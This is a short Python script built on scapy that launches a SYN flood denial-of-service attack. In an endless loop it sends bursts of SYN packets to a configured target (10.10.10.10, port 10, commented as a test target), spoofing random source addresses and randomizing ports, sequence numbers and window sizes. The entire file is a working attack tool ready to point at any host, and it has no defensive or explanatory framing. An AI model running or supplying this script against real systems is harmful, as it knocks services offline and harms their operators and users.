import random
from scapy.all import IP, TCP, send

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def generate_random_port():
    return random.randint(1024, 65535)

targets_to_open_ports = {
    "10.10.10.10": [10]  # test target
}

VERY_LARGE_NUMBER = 2000

def main():
    print("Starting SYN flood with randomized TCP parameters...")
    print("Press Ctrl+C to stop.")
    
    while True:
        # Pick a random target IP
        target_ip = random.choice(list(targets_to_open_ports.keys()))
        # Pick a random port from that target's list
        target_port = random.choice(targets_to_open_ports[target_ip])

        for _ in range(VERY_LARGE_NUMBER):
            # Randomized TCP parameters
            src_ip = generate_random_ip()
            src_port = generate_random_port()
            seq_num = random.randint(0, 4294967295)  # 32-bit sequence number
            
            # Craft SYN packet
            packet = IP(dst=target_ip, src=src_ip) / \
                     TCP(sport=src_port,
                         dport=target_port,
                         flags="S",
                         seq=seq_num,
                         window=random.randint(1024, 65535),   # random window size
                         options=[('MSS', 1460)])               # common MSS option

            try:
                send(packet, verbose=False)
            except Exception as e:
                print(f"Error sending packet: {e}")
                # Continue anyway

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped by user.")